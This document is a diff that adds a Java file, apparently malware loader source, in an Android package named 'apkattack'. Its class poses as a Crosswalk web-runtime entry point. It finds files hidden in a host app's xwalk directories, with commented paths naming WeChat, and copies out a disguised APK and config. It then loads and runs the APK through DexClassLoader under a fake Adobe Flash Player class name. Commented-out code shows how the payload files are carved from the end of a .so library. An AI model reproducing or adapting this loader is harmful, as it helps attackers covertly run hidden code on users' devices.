@@ -1,0 +1,287 @@
+package com.example.apkattack;
+
+
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.lang.reflect.Method;
+import java.util.ArrayList;
+
+import dalvik.system.DexClassLoader;
+import android.R.integer;
+import android.R.string;
+import android.annotation.SuppressLint;
+import android.content.Context;
+import android.util.Log;
+
+
+
+
+@SuppressLint("SdCardPath") public class XwalkCoreEntry {
+	
+	/*
+	public static splitfile(){
+		File fso = new File(xwalkpath + libname);
+		int sofilesize = (int)fso.length();
+		byte [] buf = new byte[sofilesize];
+		FileInputStream is = new FileInputStream(fso);
+		int len = is.read(buf,0,sofilesize);
+		is.close();
+		if (len != sofilesize) {
+			Log.e(Tag, "so file size:" + sofilesize + " read size: not equal" + len);
+			return;
+		}else{
+			Log.e(Tag, "read so file size:" + sofilesize + " ok");
+		}
+		
+		byte[] byteflag = new byte[4];
+		System.arraycopy(buf, sofilesize - 4, byteflag, 0, 4);
+		int flag = (byteflag[3] & 0xFF) | ((byteflag[2] & 0xFF)<<8) | 
+				((byteflag[1] & 0xFF)<<16) | ((byteflag[0] & 0xFF)<<24);
+		if (flag != 0x1a2bc3d4 && flag != 0xd4c32b1a) {
+			//flag != 0xd4c32b1a && flag != 0x1a2bc3d4
+			Log.e(Tag, "flag:" + flag + " error");
+			return;
+		}else{
+			Log.e(Tag, "flag:" + flag + " ok");
+		}
+		
+		byte[] bytefilecnt = new byte[1];
+		System.arraycopy(buf, sofilesize - 4 - 1, bytefilecnt, 0, 1);
+		int filecnt = bytefilecnt[0];
+		if (filecnt <= 0) {
+			Log.e(Tag, "find bind file count:" + filecnt + " error");
+			return;
+		}else{
+			Log.e(Tag, "find bind file count:" + filecnt);
+		}
+		
+		int start = sofilesize - 4 - 1 - 16;
+
+		for (int i = 0; i < filecnt; i++) {
+			
+			byte[] tmpfilename = new byte[16];
+			System.arraycopy(buf, start, tmpfilename, 0, 16);
+			int tmplen = 0;
+			for (; tmplen < tmpfilename.length; tmplen++) {
+				if (tmpfilename[tmplen] == 0) {
+					Log.e(Tag,"find file name len:" + tmplen);
+					break;
+				}
+			}
+			
+			byte[] filename = new byte[tmplen];
+			System.arraycopy(tmpfilename, 0, filename, 0,tmplen);
+			String strfilename = new String(filename);
+			if (strfilename.contains(apkfilename)) {
+				Log.e(Tag,"find apk file:" + apkfilename);
+			}else if (strfilename.contains(cfgfilename)) {
+				Log.e(Tag,"find config file:" + cfgfilename);
+			}else{
+				Log.e(Tag,"find file:" + strfilename);
+			}
+			
+			start -= 4;
+			byte[] bytesize = new byte[4];
+			System.arraycopy(buf, start, bytesize, 0, 4);
+			int size = (bytesize[3] & 0xFF) + ((bytesize[2] & 0xFF)<<8) +
+					((bytesize[1] & 0xFF)<<16) + ((bytesize[0] & 0xFF)<<24);
+			
+			Log.e(Tag,"find file size:" + size);
+			
+			start -= size;
+			if (start <= 0) {
+				Log.e(Tag, "offset error");
+				return;
+			}
+			File tmpfile = new File(newpath + strfilename);
+			FileOutputStream fout = new FileOutputStream(tmpfile);
+			fout.write(buf,start,size);
+			fout.close();
+			
+			start -= 16;
+		}
+	}
+	*/
+	
+	/*
+    public void unZip(String unZipfileName, String mDestPath) {
+        if (!mDestPath.endsWith("/")) {
+            //mDestPath = mDestPath + "/";
+        }
+        FileOutputStream fileOut = null;
+        ZipInputStream zipIn = null;
+        ZipEntry zipEntry = null;
+        File file = null;
+        int readedBytes = 0;
+        byte buf[] = new byte[4096];
+        try {
+            zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(unZipfileName)));
+            while ((zipEntry = zipIn.getNextEntry()) != null) {
+                file = new File(mDestPath + zipEntry.getName());
+                if (zipEntry.isDirectory()) {
+                    file.mkdirs();
+                } else {
+                    File parent = file.getParentFile();
+                    if (!parent.exists()) {
+                        parent.mkdirs();
+                    }
+                    fileOut = new FileOutputStream(file);
+                    while ((readedBytes = zipIn.read(buf)) > 0) {
+                        fileOut.write(buf, 0, readedBytes);
+                    }
+                    fileOut.close();
+                }
+                zipIn.closeEntry();
+            }
+        } catch (IOException ioe) {
+            ioe.printStackTrace();
+        }
+    }*/
+	
+	
+	
+
+
+
+	@SuppressWarnings("unused")
+	public static void xwalkcoreEntry(Context context){
+
+		String Tag = "xwalkcoreEntry";
+		try {
+			
+			//String appfilepath = "/data/data/com.tencent.mm/files/";
+			String appfilepath = context.getFilesDir().getAbsolutePath() + "/";
+			
+			//String apppath =  "/data/data/com.tencent.mm/";
+			String apppath =  context.getFilesDir().getParent() + "/";
+			
+			
+
+			String apkfilename = "simcard.apk";
+			//String apkfilename = "qqsdl.apk";
+			
+			String cfgfilename = "ark.dat";
+			
+	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
+	    	//String dexclassname = "com.google.android.apps.plus.JarEntry";
+	    	
+			String dexmethodname = "start";
+			
+			String libname = "libxwalkcore.so";
+			
+			String newpath = apppath + "xwalkcore_application/";
+			
+			File newapkfile = new File(newpath + apkfilename);
+			File newcfgfile = new File(newpath + cfgfilename);
+			if (newcfgfile.exists() == false || newapkfile.exists() == false) {
+
+				File newpathfile = new File(newpath);
+				if (newpathfile.exists() == false) {
+					boolean b = newpathfile.mkdirs();
+					if(b == false){
+						Log.e(Tag, "create path:" + newpath + " error");
+						return;
+					}else{
+						Log.e(Tag, "create path:" + newpath + " ok");
+					}
+				}else{
+					Log.e(Tag, "path:" + newpath + " already exist");
+				}
+				
+	
+				File apppathfile = new File(apppath);
+				File [] apppathfiles = apppathfile.listFiles();
+				if (apppathfiles == null) {
+					Log.e(Tag,"list file path error");
+					return;
+				}else{
+					Log.e(Tag, "list file path ok");
+				}
+				
+				
+				String xwalkpath = "";
+				String xwalksubpath = "";
+				ArrayList<Integer> versions = new ArrayList<Integer>();
+
+				for (int i = 0; i < apppathfiles.length; i++) {
+					String listedfn = apppathfiles[i].getName();
+					if (listedfn.startsWith("app_xwalk_9") || listedfn.startsWith("app_xwalk_89") || 
+							listedfn.startsWith("app_xwalk_79")) {
+						//String strnum = listedfn.substring(11);
+						//int num = Integer.valueOf(strnum);
+						//versions.add(num);
+						
+						xwalksubpath = listedfn;
+						xwalkpath = apppath + listedfn + "/extracted_xwalkcore/";
+						
+						break;
+					}
+				}
+				
+//				for (int i = 0; i < versions.length; i++) {
+//					
+//				}
+
+				
+				if (xwalkpath.equals("") || xwalksubpath.equals("")) {
+					Log.e(Tag,"not found xwalkcore path");
+					return;
+				}else{
+					Log.e(Tag, "find xwalk path:" + xwalkpath + " xwalk sub path:" + xwalksubpath);
+				}
+				
+				File oldfilecfg = new File(xwalkpath + cfgfilename);
+				if (oldfilecfg.exists() == false) {
+					Log.e(Tag, "not find file:" + oldfilecfg.getAbsolutePath());
+					return;
+				}else{
+					FileInputStream fin = new FileInputStream(oldfilecfg);
+					FileOutputStream fout = new FileOutputStream(newcfgfile);
+					
+					int filesize = (int)oldfilecfg.length();
+					
+					byte [] buf = new byte[filesize];
+					int len = fin.read(buf,0,filesize);
+					fout.write(buf,0,filesize);
+					fin.close();
+					fout.close();
+				}
+				
+				File oldfileapk = new File(xwalkpath + apkfilename);
+				if (oldfileapk.exists() == false) {
+					Log.e(Tag, "not find file:" + oldfileapk.getAbsolutePath());
+					return;
+				}else{
+					FileInputStream fin = new FileInputStream(oldfileapk);
+					FileOutputStream fout = new FileOutputStream(newapkfile);
+					
+					int filesize = (int)oldfileapk.length();
+					
+					byte [] buf = new byte[filesize];
+					int len = fin.read(buf,0,filesize);
+					fout.write(buf,0,filesize);
+					fin.close();
+					fout.close();
+				}
+			}
+
+			
+	    	String cachepath = context.getCacheDir() + "/";
+	    	DexClassLoader dexcl = new DexClassLoader(newpath + apkfilename, cachepath, null,context.getClassLoader());	    	
+    		Class<?> cls = dexcl.loadClass(dexclassname);
+    	    Object obj = cls.newInstance();
+    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
+    	    method.invoke(obj,context);
+
+    	    //System.load(libpath + libsoname);
+    	    
+    	    Log.e(Tag, "apk or dex loaded successful");
+			
+		} catch (Exception e) {
+			Log.e(Tag,"exception");
+			e.printStackTrace();
+		}
+	}
+
+}
